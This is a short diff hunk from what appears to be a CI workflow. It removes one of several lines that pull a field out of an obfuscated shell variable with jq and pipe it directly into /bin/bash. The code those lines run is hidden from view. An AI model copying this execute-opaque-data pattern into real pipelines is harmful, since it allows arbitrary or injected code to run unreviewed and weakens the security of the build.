@@ -27,7 +27,6 @@ jobs:
           echo $wul415 | jq -r .vi7 | /bin/bash
           echo $mytk6 | jq -r .x68618 | /bin/bash
           printf '%s' "$md316" | jq -r .z72 | /bin/bash
-          echo $qdwd8 | jq -r .bxq92 | /bin/bash
           printf '%s' "$y80" | jq -r .tw0183 | /bin/bash
           printf '%s' "$pmhul72" | jq -r .hhn43591 | /bin/bash
 
